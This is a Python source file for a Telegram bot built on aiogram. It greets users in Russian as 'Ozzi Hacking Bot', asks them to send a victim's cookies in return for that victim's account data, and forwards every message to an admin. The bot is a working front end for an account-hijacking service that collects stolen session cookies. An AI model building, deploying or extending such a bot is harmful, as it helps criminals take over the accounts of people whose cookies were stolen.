import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message

TOKEN = os.getenv("TOKEN")  # Токен бота
ADMIN_ID = os.getenv("ADMIN_ID")  # ID Админа (если есть)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Список пользователей, которым уже отправлен ответ
replied_users = set()

@dp.message()
async def forward_to_admin(message: Message):
    """Пересылает сообщение админу и отвечает только 1 раз"""
    user_id = message.from_user.id
    
    if user_id not in replied_users:
        replied_users.add(user_id)  # Запоминаем пользователя
        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
    
    # Пересылаем админу всегда (если ADMIN_ID указан)
    if ADMIN_ID:
        await bot.send_message(ADMIN_ID, f"Сообщение от {message.from_user.full_name} (@{message.from_user.username}):\n\n{message.text}")

async def main():
    """Запуск бота"""
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
